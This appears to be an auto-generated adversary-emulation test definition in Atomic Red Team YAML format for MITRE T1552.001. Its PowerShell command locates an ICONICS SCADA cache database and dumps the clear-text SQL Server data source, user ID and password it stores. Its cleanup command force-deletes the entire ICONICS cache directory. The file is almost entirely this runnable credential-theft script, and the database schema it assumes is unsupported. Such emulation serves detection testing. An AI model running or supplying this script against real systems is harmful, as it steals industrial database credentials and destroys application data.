# Auto-generated by CIPHER v5.0
# Source: 2af63d5411bb
attack_technique: T1552.001
display_name: "T1552.001 - Credentials In Files (ICONICS Local Cache Extraction)"
atomic_tests:
  - name: "T1552.001 - Credentials In Files (ICONICS Local Cache Extraction)"
    description: |
      Extract clear‑text SQL Server credentials from ICONICS local cache SQLite/SDF file.
    supported_platforms:
      - windows
    executor:
      name: powershell
      command: |
        $cache = Get-ChildItem "C:\ProgramData\ICONICS\Cache" -Recurse -Include *.sdf,*.sqlite3 | Select-Object -First 1;
        $db = $cache.FullName;
        $connStr = "Data Source=$db;Version=3;Read Only=True;";
        $conn = New-Object System.Data.SQLite.SQLiteConnection $connStr;
        $conn.Open();
        $cmd = $conn.CreateCommand();
        $cmd.CommandText = "SELECT DataSource, UserID, Password FROM ConnectionCache";
        $reader = $cmd.ExecuteReader();
        while($reader.Read()){
          Write-Output "DS:$($reader[0]) UID:$($reader[1]) PWD:$($reader[2])";
        };
        $conn.Close();
      cleanup_command: |
        Remove-Item "C:\ProgramData\ICONICS\Cache\*" -Force -Recurse
